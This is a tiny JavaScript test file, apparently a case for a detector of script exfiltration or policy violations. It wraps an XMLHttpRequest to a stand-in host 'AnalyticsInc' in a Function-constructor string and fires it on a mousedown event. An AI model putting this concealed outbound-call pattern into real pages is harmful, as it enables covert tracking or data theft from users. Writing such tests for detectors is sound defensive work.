// exfil_test_onmousedown2.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onmousedown2", true);xmlhttp.send(null);';
document.getElementById("test").addEventListener("mousedown", JAM.call(Function, null, [exp]), false)

